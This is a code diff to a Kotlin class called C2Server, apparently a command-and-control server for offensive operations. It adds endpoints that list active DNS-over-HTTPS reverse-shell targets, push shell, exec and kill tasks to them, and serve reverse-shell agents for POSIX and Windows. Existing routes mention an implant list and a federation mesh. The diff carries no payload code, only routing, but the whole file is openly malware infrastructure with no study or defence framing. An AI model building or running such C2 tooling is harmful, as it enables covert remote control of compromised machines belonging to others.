@@ -23,6 +23,10 @@ import java.io.IOException
  *   POST /ai               QCLI_API command dispatcher
  *   GET|POST /federation/reg   FEDERATION mesh: identity / implant-list merge
  *   POST /federation/peer      FEDERATION mesh: peer registration
+ *   GET  /api/dohshell/targets  active DoH reverse-shell targets
+ *   POST /api/dohshell/task     push a task (shell/exec/kill) to a target
+ *   GET  /api/dohshell/agent/posix   serve POSIX DoH reverse-shell agent
+ *   GET  /api/dohshell/agent/windows serve Windows DoH reverse-shell agent
  */
 class C2Server(
     port: Int,
@@ -61,6 +65,18 @@ class C2Server(
 
             method == Method.POST && uri == "/federation/peer" ->
                 json(Federation.addPeer(jsonBody(session) ?: JSONObject()).toString())
+
+            method == Method.GET && uri == "/api/dohshell/targets" ->
+                json(C2State.dohShellTargets().toString())
+
+            method == Method.POST && uri == "/api/dohshell/task" ->
+                json(C2State.pushDohTask(jsonBody(session) ?: JSONObject()).toString())
+
+            method == Method.GET && uri == "/api/dohshell/agent/posix" ->
+                newFixedLengthResponse(Response.Status.OK, "text/plain; charset=utf-8", Agents.dohPosix())
+
+            method == Method.GET && uri == "/api/dohshell/agent/windows" ->
+                newFixedLengthResponse(Response.Status.OK, "text/plain; charset=utf-8", Agents.dohWindows())
 
             method == Method.POST && uri == "/ai" ->
                 handleAi(session)
